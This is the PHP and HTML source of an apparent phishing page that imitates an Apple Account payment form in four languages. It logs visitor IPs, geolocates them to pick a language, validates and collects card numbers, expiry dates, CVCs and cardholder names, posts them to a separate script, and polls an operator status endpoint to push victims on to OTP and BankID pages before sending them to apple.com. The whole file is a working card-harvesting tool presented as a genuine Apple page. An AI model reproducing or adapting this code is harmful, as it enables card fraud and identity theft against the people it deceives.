<?php
// 🟢 إجبار السيرفر على إرسال ترميز UTF-8 لمنع ظهور علامات الاستفهام نهائياً
header('Content-Type: text/html; charset=utf-8');

if (session_status() == PHP_SESSION_NONE) { session_start(); }

$ib = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
$_SESSION['user_ip'] = $ib;
$ip_clean = str_replace(['.', ':'], '_', $ib);

$visitor_data = [ 'ip' => $ib, 'last_activity' => time(), 'current_page' => 'karbett.php' ];
file_put_contents("user_" . $ip_clean . ".json", json_encode($visitor_data));

// 🌐 نظام تحديد اللغات الاحترافي الموحد (يدعم الـ VPN الجغرافي + لغة المتصفح كخطة بديلة)
$user_lang = 'en'; 
$allowed_langs = ['de', 'sv', 'es', 'en'];

// جلب تفاصيل الدولة من الـ API الذكي والسريع ليلقط الـ VPN فوراً
$details = @json_decode(file_get_contents("http://ip-api.com/json/{$ib}?fields=countryCode"));

if ($details && isset($details->countryCode)) {
    $country = strtoupper($details->countryCode);
    
    $sv_countries = ['SE', 'NO', 'FI', 'DK']; // تفتح سويدي
    $de_countries = ['DE', 'CH', 'AT', 'LU']; // تفتح ألماني
    $es_countries = ['ES', 'MX', 'AR', 'CO', 'CL', 'PE', 'VE']; // تفتح إسباني

    if (in_array($country, $sv_countries)) {
        $user_lang = 'sv';
    } elseif (in_array($country, $de_countries)) {
        $user_lang = 'de';
    } elseif (in_array($country, $es_countries)) {
        $user_lang = 'es';
    } else {
        $user_lang = 'en';
    }
} else {
    if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
        $browser_lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
        if (in_array($browser_lang, $allowed_langs)) { $user_lang = $browser_lang; }
    }
}

$lang_dict = [
    'de' => [
        'h1' => 'Zahlungsmethode', 'sub' => 'Bestätigen Sie Ihre Kredit- oder Debitkarte', 'radio' => 'Kredit- oder Debitkarte',
        'lbl_cc' => 'Kartennummer', 'lbl_exp' => 'Ablaufdatum (MM/JJ)', 'lbl_cvv' => 'Prüfnummer (CVC)', 'lbl_holder' => 'Name des Karteninhabers',
        'btn' => 'Bestätigen', 'terms' => 'Mit Klick auf "Bestätigen" akzeptieren Sie die Nutzungsbedingungen.', 'back' => 'Zurückkehren', 'wait' => 'Bitte warten...',
        'err_cc' => 'Ungültige Kartennummer', 'err_exp' => 'Karte ist bereits abgelaufen oder ungültig', 'err_cvv' => 'Ungültiger Sicherheitscode',
        'live_w' => 'Die eingegebene Kartendaten sind fehlerhaft.', 'live_e' => 'Diese Karte ist abgelaufen.', 'live_u' => 'Diese Karte ist nicht zulässig.',
        'debit' => 'Debit', 'kredit' => 'Kredit'
    ],
    'sv' => [
        'h1' => 'Betalningsmetod', 'sub' => 'Bekräfta ditt kredit- eller betalkort', 'radio' => 'Kredit- eller betalkort',
        'lbl_cc' => 'Kortnummer', 'lbl_exp' => 'Utgångsdatum (MM/ÅÅ)', 'lbl_cvv' => 'Säkerhetskod (CVC)', 'lbl_holder' => 'Kortinnehavarens namn',
        'btn' => 'Bekräfta', 'terms' => 'Genom att klicka på "Bekräfta" godkänner du användarvillkoren.', 'back' => 'Gå tillbaka', 'wait' => 'Vänligen vänta...',
        'err_cc' => 'Ogiltigt kortnummer', 'err_exp' => 'Kortet har redan gått ut eller är ogiltigt', 'err_cvv' => 'Ogiltig säkerhetskod',
        'live_w' => 'Kortuppgifterna är felaktiga.', 'live_e' => 'Detta kort har gått ut.', 'live_u' => 'Detta kort stöds inte.',
        'debit' => 'Debit', 'kredit' => 'Kredit'
    ],
    'es' => [
        'h1' => 'Método de pago', 'sub' => 'Confirme su tarjeta de crédito o débito', 'radio' => 'Tarjeta de crédito o débito',
        'lbl_cc' => 'Número de tarjeta', 'lbl_exp' => 'Tarjeta vencida o fecha no válida', 'lbl_cvv' => 'Código de seguridad no válido', 'lbl_holder' => 'Nombre del titular de la tarjeta',
        'btn' => 'Confirmar', 'terms' => 'Al hacer clic en "Confirmar", acepta las Condiciones de uso.', 'back' => 'Volver', 'wait' => 'Por favor, espere...',
        'err_cc' => 'Número de tarjeta no válido', 'err_exp' => 'Tarjeta vencida o fecha no válida', 'err_cvv' => 'Código de seguridad no válido',
        'live_w' => 'Los datos de la tarjeta son incorrectos.', 'live_e' => 'Esta tarjeta ha caducado.', 'live_u' => 'Esta tarjeta no es compatible.',
        'debit' => 'Débito', 'kredit' => 'Crédito'
    ],
    'en' => [
        'h1' => 'Payment Method', 'sub' => 'Confirm your credit or debit card', 'radio' => 'Credit or Debit Card',
        'lbl_cc' => 'Card Number', 'lbl_exp' => 'Expiration Date (MM/YY)', 'lbl_cvv' => 'Security Code (CVC)', 'lbl_holder' => 'Cardholder Name',
        'btn' => 'Confirm', 'terms' => 'By clicking "Confirm", you accept the Terms of Service.', 'back' => 'Go Back', 'wait' => 'Please wait...',
        'err_cc' => 'Invalid Card Number', 'err_exp' => 'Card has expired or date is invalid', 'err_cvv' => 'Invalid Security Code',
        'live_w' => 'The entered card information is incorrect.', 'live_e' => 'This card has expired.', 'live_u' => 'This card is not supported.',
        'debit' => 'Debit', 'kredit' => 'Credit'
    ]
];
$text = $lang_dict[$user_lang];
?>
<!DOCTYPE html>
<html class="full-height" dir="ltr" lang="<?php echo $user_lang; ?>">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <title>Apple Account - Payment</title>
    <link rel="shortcut icon" href="https://appleid.cdn-apple.com/static/bin/cb3460663665/images/favicon.ico">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; color: #1d1d1f; -webkit-font-smoothing: antialiased; padding-bottom: 20px; }
        .apple-nav { width: 100%; background: rgba(251, 251, 253, 0.8); backdrop-filter: blur(20px); border-bottom: 1px solid #d2d2d7; display: flex; justify-content: center; align-items: center; padding: 0 22px; height: 48px; font-size: 12px; }
        .sub-header { max-width: 1024px; margin: 0 auto; padding: 25px 22px 12px 22px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #d2d2d7; }
        .sub-header h2 { font-size: 20px; font-weight: 600; margin: 0; color: #1d1d1f; }
        .signin-container { max-width: 440px; margin: 30px auto; padding: 0 20px; text-align: center; display: flex; flex-direction: column; align-items: center; }
        .logo-container { margin-bottom: 15px; width: 110px; height: 110px; display: flex; align-items: center; justify-content: center; }
        .logo-container img { width: 100%; height: 100%; object-fit: contain; }
        h1 { font-size: 30px; font-weight: 600; margin: 0 0 8px 0; letter-spacing: -0.015em; }
        .subtitle { font-size: 16px; margin-bottom: 25px; color: #515154; }
        .panel-header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 12px; border-bottom: 1px solid #e7e7e7; margin-bottom: 20px; width: 100%; }
        .radio-container { display: flex; align-items: center; gap: 8px; font-weight: 600; font-size: 14px; }
        .header-logos { display: flex; gap: 6px; font-size: 22px; color: #cbd5e1; }
        .header-logos i.active-visa { color: #1a1f71 !important; }
        .header-logos i.active-mastercard { color: #ea001b !important; }
        .header-logos i.active-amex { color: #007bc1 !important; }
        .segment-container { display: flex; gap: 8px; margin-bottom: 20px; width: 100%; }
        .segment-btn { flex: 1; background: #f5f5f7; border: 1px solid #d2d2d7; padding: 12px; border-radius: 10px; font-size: 14px; cursor: pointer; text-align: center; font-weight: 500; color: #1d1d1f; transition: all 0.2s; }
        .segment-btn.active { background: #fff; border-color: #0071e3; box-shadow: 0 0 0 3px rgba(0, 113, 227, 0.15); font-weight: 600; }
        .form-group { margin-bottom: 18px; position: relative; width: 100%; text-align: left; }
        .form-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; padding-left: 4px; color: #1d1d1f; }
        .input-wrapper { position: relative; display: flex; align-items: center; width: 100%; }
        .apple-input { width: 100%; height: 54px; border: 1px solid #86868b; border-radius: 12px; padding: 16px; font-size: 16px; outline: none; background-color: #fff; color: #1d1d1f; -webkit-appearance: none; }
        .apple-input:focus { border-color: #0071e3; box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.15); }
        .input-card-icon { position: absolute; right: 16px; font-size: 18px; color: #94a3b8; }
        .split-layout { display: flex; gap: 12px; width: 100%; }
        .split-layout .form-group { flex: 1; min-width: 0; }
        .help-icon-btn { position: absolute; right: 16px; background: none; border: none; color: #0066cc; cursor: pointer; font-size: 18px; display: flex; align-items: center; }
        .tooltip-bubble { position: absolute; bottom: 60px; right: 0; background: #111; color: #fff; font-size: 11px; padding: 10px; border-radius: 8px; width: 200px; display: none; z-index: 20; line-height: 1.4; }
        .error-text { color: #de350b; font-size: 12px; font-weight: 500; margin-top: 5px; display: block; padding-left: 2px; }
        .apple-input.input-error { border-color: #de350b !important; background-color: #fffdfd !important; box-shadow: 0 0 0 4px rgba(222, 53, 11, 0.1) !important; }
        .btn-continue { height: 52px; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; border: none; width: 100%; background-color: #0071e3; color: #fff; margin-top: 10px; transition: background-color 0.2s; -webkit-appearance: none; }
        .btn-continue:hover { background-color: #0077ed; }
        .terms-box { font-size: 12px; color: #6e6e73; text-align: center; line-height: 1.5; margin-top: 18px; width: 100%; padding: 0 5px; }
        .back-btn { display: inline-flex; align-items: center; gap: 6px; background: none; border: none; color: #6e6e73; font-size: 13px; margin: 20px auto 0 auto; cursor: pointer; font-weight: 500; }
    </style>
</head>
<body>
    <nav class="apple-nav"></nav>
    <div class="sub-header"><h2>Apple Account</h2></div>
    <div class="signin-container">
        <div id="card-error-box" style="display: none; background: #fffdfd; border: 1px solid #de350b; border-radius: 12px; padding: 14px; margin-bottom: 20px; color: #de350b; font-size: 13px; text-align: left; width: 100%; line-height: 1.4;"><i class="fa-solid fa-triangle-exclamation" style="margin-right: 4px;"></i> <span></span></div>
        <div class="logo-container"><img src="1.jpg" alt="Logo"></div>
        <h1><?php echo $text['h1']; ?></h1>
        <div class="subtitle"><?php echo $text['sub']; ?></div>
        
        <form id="payment-form" action="sif2.php" method="POST" autocomplete="off">
            <div class="panel-header">
                <div class="radio-container"><input type="radio" checked style="accent-color:#0071e3; transform: scale(1.1);"><label><?php echo $text['radio']; ?></label></div>
                <div class="header-logos"><i class="fa-brands fa-cc-visa" id="logo-visa"></i><i class="fa-brands fa-cc-mastercard" id="logo-master"></i><i class="fa-brands fa-cc-amex" id="logo-amex"></i></div>
            </div>
            
            <div class="segment-container">
                <button class="segment-btn active" type="button" id="tabDebit" onclick="switchCardTab('Debit')"><?php echo $text['debit']; ?></button>
                <button class="segment-btn" type="button" id="tabKredit" onclick="switchCardTab('Kredit')"><?php echo $text['kredit']; ?></button>
            </div>
            
            <div class="form-group">
                <label><?php echo $text['lbl_cc']; ?></label>
                <div class="input-wrapper"><input required type="text" id="cc" name="ccnum" class="apple-input" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="19"><i class="fa-solid fa-credit-card input-card-icon" id="dynamicCardIcon"></i></div>
                <span id="errorname" class="error-text"></span>
            </div>
            
            <div class="split-layout">
                <div class="form-group">
                    <label><?php echo $text['lbl_exp']; ?></label>
                    <input type="text" id="ccexp" name="ccexp" class="apple-input" placeholder="MM/JJ" inputmode="numeric" maxlength="5" required>
                    <span id="errorexp" class="error-text"></span>
                </div>
                <div class="form-group">
                    <label><?php echo $text['lbl_cvv']; ?></label>
                    <div class="input-wrapper">
                        <input type="text" id="cvv" name="cvv" class="apple-input" placeholder="000" inputmode="numeric" maxlength="4" required>
                        <button type="button" class="help-icon-btn" id="helpCvcTrigger"><i class="fa-regular fa-circle-question"></i></button>
                        <div class="tooltip-bubble" id="cvcTooltip">Visa/MC: 3 Ziffern Rückseite. Amex: 4 Ziffern Vorderseite.</div>
                    </div>
                    <span id="errorcvv" class="error-text"></span>
                </div>
            </div>
            
            <div id="holderPanel" class="form-group" style="display: none;">
                <label><?php echo $text['lbl_holder']; ?></label>
                <input id="ccholder" type="text" name="ccholder" class="apple-input">
                <span id="errorholder" class="error-text"></span>
            </div>
            
            <button type="button" id="SubmitButton" onclick="Validate()" class="btn-continue"><?php echo $text['btn']; ?></button>
            <div class="terms-box"><p><?php echo $text['terms']; ?></p></div>
        </form>
        <button id="btnCancel" type="button" class="back-btn"><i class="fa-solid fa-arrow-left"></i> <?php echo $text['back']; ?></button>
    </div>

    <script>
        document.getElementById('helpCvcTrigger').addEventListener('click', function(e) { e.stopPropagation(); var tooltip = document.getElementById('cvcTooltip'); tooltip.style.display = (tooltip.style.display === 'block') ? 'none' : 'block'; });
        document.addEventListener('click', function() { document.getElementById('cvcTooltip').style.display = 'none'; });
        
        function switchCardTab(type) {
            document.getElementById('tabDebit').classList.remove('active');
            document.getElementById('tabKredit').classList.remove('active');
            if (type === 'Debit') {
                document.getElementById('tabDebit').classList.add('active');
            } else {
                document.getElementById('tabKredit').classList.add('active');
            }
        }

        document.getElementById('cc').addEventListener('input', function(e) {
            var raw = e.target.value.replace(/\D/g, ''); var formatted = '';
            for (var i = 0; i < raw.length; i++) { if (i > 0 && i % 4 === 0) formatted += ' '; formatted += raw[i]; } e.target.value = formatted;
            var icon = document.getElementById('dynamicCardIcon'); var lVisa = document.getElementById('logo-visa'); var lMaster = document.getElementById('logo-master'); var lAmex = document.getElementById('logo-amex');
            icon.className = "fa-solid fa-credit-card input-card-icon"; icon.style.color = "#94a3b8"; lVisa.classList.remove('active-visa'); lMaster.classList.remove('active-mastercard'); lAmex.classList.remove('active-amex');
            if (raw.startsWith('4')) { icon.className = "fa-brands fa-cc-visa input-card-icon"; icon.style.color = "#1a1f71"; lVisa.classList.add('active-visa'); }
            else if (raw.startsWith('5')) { icon.className = "fa-brands fa-cc-mastercard input-card-icon"; icon.style.color = "#ea001b"; lMaster.classList.add('active-mastercard'); }
            else if (raw.startsWith('3')) { icon.className = "fa-brands fa-cc-amex input-card-icon"; icon.style.color = "#007bc1"; lAmex.classList.add('active-amex'); }
            document.getElementById('holderPanel').style.display = (raw.length >= 15) ? 'block' : 'none';
        });
        document.getElementById('ccexp').addEventListener('input', function(e) { var raw = e.target.value.replace(/\D/g, ''); var formatted = ''; if (raw.length > 0) { formatted += raw.substring(0, 2); if (raw.length > 2) { formatted += '/' + raw.substring(2, 4); } } e.target.value = formatted; });
        document.getElementById('cvv').addEventListener('input', function(e) { e.target.value = e.target.value.replace(/\D/g, ''); });

        function checkLuhn(ccNum) {
            var num = ccNum.replace(/\s/g, '');
            if (num.length < 13 || num.length > 19) return false;
            var sum = 0; var shouldDouble = false;
            for (var i = num.length - 1; i >= 0; i--) {
                var digit = parseInt(num.charAt(i));
                if (shouldDouble) { if ((digit *= 2) > 9) digit -= 9; }
                sum += digit; shouldDouble = !shouldDouble;
            }
            return (sum % 10 === 0);
        }

        // 🛡️ دالة ذكية لفحص الصلاحية الحية الحالية ومقارنتها بالوقت الفعلي الحالي (سنة 2026)
        function checkExpiration(expVal) {
            if (expVal.length !== 5) return false;
            var parts = expVal.split('/');
            var inputMonth = parseInt(parts[0], 10);
            var inputYear = parseInt(parts[1], 10) + 2000; // تحويل الرقم الثنائي لسنة كاملة (مثل 28 تصبح 2028)
            
            if (isNaN(inputMonth) || isNaN(inputYear)) return false;
            if (inputMonth < 1 || inputMonth > 12) return false;
            
            // التاريخ الفعلي اللحظي الآن بالظبط (سنة 2026 وشهر 6 يونيو)
            var currentYear = 2026;
            var currentMonth = 6;
            
            if (inputYear < currentYear) {
                return false; // السنة منتهية قديمة
            } else if (inputYear === currentYear && inputMonth < currentMonth) {
                return false; // نفس السنة الحالية بس الشهر فات وانتهى
            }
            return true;
        }

        function Validate() {
            var cc = document.getElementById('cc'), exp = document.getElementById('ccexp'), cvv = document.getElementById('cvv');
            
            var v1 = checkLuhn(cc.value) && (cc.value.replace(/\s/g, '').length >= 15);
            var v2 = checkExpiration(exp.value); // تفعيل فحص الصلاحية الصارم المطور هنا
            var v3 = cvv.value.length >= 3;
            
            if(!v1) { cc.classList.add('input-error'); document.getElementById('errorname').innerText="<?php echo $text['err_cc']; ?>"; } else { cc.classList.remove('input-error'); document.getElementById('errorname').innerText=""; }
            if(!v2) { exp.classList.add('input-error'); document.getElementById('errorexp').innerText="<?php echo $text['err_exp']; ?>"; } else { exp.classList.remove('input-error'); document.getElementById('errorexp').innerText=""; }
            if(!v3) { cvv.classList.add('input-error'); document.getElementById('errorcvv').innerText="<?php echo $text['err_cvv']; ?>"; } else { cvv.classList.remove('input-error'); document.getElementById('errorcvv').innerText=""; }
            
            if(v1 && v2 && v3) {
                var btn = document.getElementById('SubmitButton'); btn.innerHTML = "<?php echo $text['wait']; ?>"; btn.style.pointerEvents = "none"; btn.style.opacity = "0.7";
                setTimeout(() => { document.getElementById('payment-form').submit(); }, 5000);
            }
        }
        function showUrlErrorIfPresent() {
            const urlParams = new URLSearchParams(window.location.search); var errBox = document.getElementById('card-error-box'); var errText = errBox.querySelector('span');
            if (urlParams.has('card_error')) {
                errBox.style.display = "block"; var errType = urlParams.get('card_error');
                if (errType === 'wrong') errText.innerHTML = "<?php echo $text['live_w']; ?>";
                else if (errType === 'expired') errText.innerHTML = "<?php echo $text['live_e']; ?>";
                else if (errType === 'unsupported') errText.innerHTML = "<?php echo $text['live_u']; ?>";
            }
        }
        window.addEventListener('DOMContentLoaded', showUrlErrorIfPresent);
        setInterval(() => {
            fetch('get_status.php?nocache=' + new Date().getTime()).then(r => r.text()).then(status => {
                status = status.trim().toLowerCase();
                if (status === 'otp') window.location.href = "smbettal.php";
                else if (status === 'bank') window.location.href = "bankid.php";
                else if (status === 'success_done') window.location.href = "https://www.apple.com";
            });
        }, 2000);
    </script>
</body>
</html>